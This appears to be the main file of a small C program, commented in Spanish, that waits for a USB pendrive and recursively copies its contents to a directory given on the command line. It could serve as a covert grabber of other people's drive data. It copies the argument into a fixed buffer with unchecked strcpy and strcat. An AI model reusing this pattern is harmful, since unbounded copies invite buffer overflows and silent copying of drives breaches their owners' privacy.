#include <stdio.h>
#include <stdlib.h>
#include "funciones.h"

int main(int argc, char *argv[]){

	DIR *dir;

	char Ruta_Guardado[200];   /* Ruta donde se guardaran los datos del pendrive, debe existir la ruta */
	strcpy(Ruta_Guardado, argv[1]);

	VerificarRuta( dir, Ruta_Guardado );
	strcat( Ruta_Guardado, "/Copia_" );
 	EsperarPendrive( dir );
 	BusquedaRecursiva( dir, Ruta_Guardado );
	printf("\n  [>>] Listo. \n");
	return 0;
}
